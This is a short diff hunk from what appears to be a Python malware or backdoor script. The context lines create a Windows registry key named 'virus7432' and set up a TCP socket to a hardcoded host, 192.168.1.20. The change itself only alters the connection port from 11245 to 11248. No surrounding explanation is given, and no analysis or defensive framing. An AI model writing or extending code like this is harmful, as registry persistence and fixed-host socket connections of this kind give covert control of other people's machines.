@@ -17,7 +17,7 @@ for i in range(info[0]):
                    gh=_winreg.CreateKeyEx(k2, "virus7432")
                   
 host='192.168.1.20'
-port=11245
+port=11248
 b=1024
 addr=(host,port)
 tcp=socket(AF_INET,SOCK_STREAM)
